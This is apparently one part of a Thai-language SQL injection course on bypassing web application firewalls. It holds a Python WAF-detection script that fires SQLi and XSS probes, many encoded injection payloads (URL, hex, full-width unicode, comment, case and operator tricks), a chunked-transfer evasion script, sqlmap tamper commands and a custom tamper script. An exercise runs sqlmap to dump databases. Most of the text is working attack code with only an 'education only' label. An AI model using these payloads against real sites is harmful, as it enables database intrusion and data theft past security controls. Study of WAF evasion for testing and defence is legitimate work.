# Part 023: WAF Bypass Techniques

## ภาพรวม

Web Application Firewall (WAF) คือสิ่งมีชีวิตที่ pentesters ต้องเผชิญในทุกวัน เรียนรู้เทคนิค bypass สำหรับการศึกษาเท่านั้น

**ขั้นตอนที่ 306-340**

---

## 306. WAF Types และ Detection

### 6.1 WAF Types

- **Cloud WAF**: Cloudflare, Akamai, Imperva, AWS WAF
- **On-premise**: ModSecurity (Apache/Nginx), F5 BIG-IP ASM
- **CDN-based**: Fastly, Sucuri

### 6.2 ตรวจสอบ WAF ด้วย Python

```python
import requests

def detect_waf(url):
    test_payloads = [
        "' OR 1=1-- -",
        "<script>alert(1)</script>",
        "' UNION SELECT 1,2,3-- -"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for payload in test_payloads:
        r = requests.get(url, params={'q': payload}, headers=headers)
        
        # WAF signatures in response
        waf_signatures = [
            ('Cloudflare', ['cf-ray', 'cloudflare']),
            ('Akamai', ['akamai', 'ak_bmsc']),
            ('Imperva', ['x-iinfo', '_imp_apg_r_']),
            ('AWS WAF', ['x-amz-apigw-id', 'x-amzn-requestid']),
            ('ModSecurity', ['mod_security', 'NOYB']),
        ]
        
        for waf_name, sigs in waf_signatures:
            for sig in sigs:
                if sig.lower() in str(r.headers).lower() or sig.lower() in r.text.lower():
                    print(f"[+] Detected WAF: {waf_name}")
                    return waf_name
        
        if r.status_code in [403, 406, 429, 503]:
            print(f"[!] Possible WAF - Status: {r.status_code}")
    
    print("[-] No WAF detected")
    return None
```

### 6.3 wafw00f Tool

```bash
# Install
pip install wafw00f

# Basic
wafw00f http://example.com

# Aggressive mode
wafw00f -a http://example.com
```

---

## 307. URL Encoding Bypass

```
' → %27
OR → %4f%52
UNION → %55%4e%49%4f%4e
SELECT → %53%45%4c%45%43%54

ตัวอย่าง:
http://example.com/item?id=1%27%20OR%20%271%27%3d%271
```

### 7.1 Double URL Encoding

```
' → %27 → %2527
SPACE → %20 → %2520

http://example.com/item?id=1%2527%2520OR%2520%25271%2527%253d%25271
```

---

## 308. Hex Encoding

```sql
-- แทน string ด้วย hex
SELECT * FROM users WHERE username = 0x61646d696e;
-- 0x61646d696e = 'admin'

-- UNION injection
' UNION SELECT 0x61646d696e,0x70617373776f7264-- -

-- hex encoding keywords (รองรับใน MySQL)
-- UNHEX() เพื่ออ่าน hex string
SELECT UNHEX('61646d696e');
```

---

## 309. Unicode/Full-Width Encoding

```
ตัวอย่าง Unicode bypass:
SELECT → ＳＥＬＥＣＴ
WHERE → ＷＨＥＲＥ
FROM → ＦＲＯＭ

URL encoded:
S = %ef%bc%b3
E = %ef%bc%a5
L = %ef%bc%ac
E = %ef%bc%a5
C = %ef%bc%a3
T = %ef%bc%b4
```

---

## 310. Comment-Based Whitespace Bypass

```sql
-- MySQL comments
SELECT/**/username,password/**/FROM/**/users
SELECT/*!username,password*/FROM users
SELECT/*-*/username/*-*/FROM/*-*/users

-- MySQL version-specific comments (ไม่ถูก block บ่อย)
SELECT /*!50000 username */ FROM users
UNION /*!50000 SELECT */ 1,2,3

-- Special whitespace characters
%09  -- tab
%0a  -- newline
%0d  -- carriage return
%0c  -- form feed
%0b  -- vertical tab

' UNION%09SELECT%0a1,2,3-- -
```

---

## 311. Case Variation

```sql
-- WAF ส่วนใหญ่ case-sensitive
SeLeCt UsErNaMe FrOm UsErS
UNiOn SeLeCt 1,2,3
sElEcT * fRoM uSeRs WhErE 1=1

-- Randomized case
SELECT username FROM users
Select UsErname From Users  
SELeCT uSeRname FROm useRS
```

---

## 312. Operator Alternatives

```sql
-- แทน =
WHERE username LIKE 'admin'
WHERE username BETWEEN 'admin' AND 'admin'
WHERE username IN ('admin')
WHERE username REGEXP '^admin$'

-- แทน OR
WHERE 1=1 || 1=1
WHERE !(1=2)
WHERE (1)=(1)

-- แทน AND
WHERE 1=1 && 1=1

-- แทน Space
WHERE/**/username='admin'
WHERE%09username='admin'
```

---

## 313. String Concatenation Bypass

```sql
-- MySQL
SELECT CONCAT('ad','min')  -- = 'admin'
SELECT CONCAT(CHAR(97,100,109,105,110))  -- = 'admin'
SELECT 0x61646d696e  -- hex = 'admin'

-- MSSQL
SELECT 'ad'+'min'

-- Oracle
SELECT 'ad'||'min'

-- PostgreSQL
SELECT 'ad'||'min'

-- ใน injection (bypass 'admin' filter)
' UNION SELECT CONCAT(CHAR(97,100),CHAR(109,105,110)),2-- -
```

---

## 314. Function Alternative Bypass

```sql
-- แทน SUBSTRING
MID('string', 1, 1)
SUBSTR('string', 1, 1)
LEFT('string', 1)

-- แทน ASCII
ORD('a')
CONV(HEX(SUBSTR('a',1,1)),16,10)

-- แทน SLEEP
BENCHMARK(5000000, MD5('test'))
```

---

## 315. HTTP Parameter Pollution (HPP)

```
# ส่ง parameter ซ้ำกัน
?id=1&id=2'
?id=1 UNION&id=SELECT 1,2,3

# WAF อาจ check เฉพาะ id=1 แต่ application ใช้ id=2'
# หรือรวม id=1 id=2' เป็น id=1 2'
```

---

## 316. Chunked Transfer Encoding

```python
import requests

def chunked_request(url, payload):
    """Send SQL injection via chunked transfer encoding"""
    
    def chunk_data(data):
        """Split data into chunks"""
        size = 3
        chunks = [data[i:i+size] for i in range(0, len(data), size)]
        return chunks
    
    # Build chunked body
    body_parts = chunk_data(f'id=1{payload}')
    
    def generate():
        for part in body_parts:
            encoded = f'{len(part):x}\r\n{part}\r\n'.encode()
            yield encoded
        yield b'0\r\n\r\n'
    
    headers = {
        'Transfer-Encoding': 'chunked',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    r = requests.post(url, data=generate(), headers=headers)
    return r

# Usage
result = chunked_request(
    'http://example.com/search',
    "' UNION SELECT 1,2,3-- -"
)
print(result.text)
```

---

## 317. SQLMap Tamper Scripts

```bash
# space2comment: SPACE -> /**/ 
sqlmap -u "..." --tamper=space2comment

# charencode: URL encode
sqlmap -u "..." --tamper=charencode

# randomcase: SeLeCt
sqlmap -u "..." --tamper=randomcase

# between: > -> NOT BETWEEN
sqlmap -u "..." --tamper=between

# equaltolike: = -> LIKE
sqlmap -u "..." --tamper=equaltolike

# modsecurityversioned: MySQL version comments
sqlmap -u "..." --tamper=modsecurityversioned

# Combine multiple
sqlmap -u "..." --tamper=space2comment,randomcase,charencode
```

---

## 318. Custom Tamper Script

```python
#!/usr/bin/env python3
# custom_tamper.py - แทน spaces ด้วย random whitespace

import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """Replace spaces with random whitespace and add case variation"""
    if payload:
        whitespace_options = ['\t', '\n', '\r', '\x0c', '\x0b', '/**/']
        result = ''
        for char in payload:
            if char == ' ':
                result += random.choice(whitespace_options)
            elif char.isalpha() and random.random() > 0.5:
                result += char.upper()
            else:
                result += char
        return result
    return payload

# ใช้งาน:
# sqlmap -u "..." --tamper=custom_tamper
```

---

## 319. Null Byte Bypass

```
# Null byte สามารถ bypass blacklist filters บางตัว
%00 ใน URL
\0 ใน string

# ตัวอย่าง
id=1%00' UNION SELECT 1,2,3-- -
id=1\0' OR '1'='1

# ใน PHP เพื่อตัด string (เพราะ C-style strings)
id=1' AND 1=1%00 AND '1'='2
# '%00 ตัด string = ' AND 1=1 (แต่ PHP สมัยใหม่ไม่ work แล้ว)
```

---

## 320. แบบฝึกหัด WAF Bypass

```bash
# 1. wafw00f ตรวจสอบ WAF
wafw00f http://example.com

# 2. ทดสอบ encoding bypass
sqlmap -u "http://example.com/item?id=1" \
  --tamper=space2comment,charencode --dbs --batch

# 3. ทดสอบ manual
# - space2comment: UNION/**/SELECT/**/1,2,3
# - case variation: UniOn SeLeCt 1,2,3
# - hex encoding: 0x7573657273 for 'users'

# 4. ถ้ายัง block ลอง advanced
sqlmap -u "http://example.com/item?id=1" \
  --tamper=space2comment,randomcase,charencode,between \
  --delay=2 --level=3 --risk=2 --dbs --batch
```

---

## สรุป

WAF Bypass techniques:
1. **URL/Hex Encoding** - เข้ารหัส characters
2. **Case Variation** - SeLeCt, UnIoN
3. **Comment Bypass** - UNION/**/SELECT
4. **Operator Alt** - LIKE, BETWEEN, REGEXP แทน =
5. **String Concat** - CONCAT(), CHAR(), hex
6. **HTTP Tricks** - HPP, Chunked Transfer
7. **SQLMap Tamper** - สร้าง custom tamper script

---

*Part 023 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
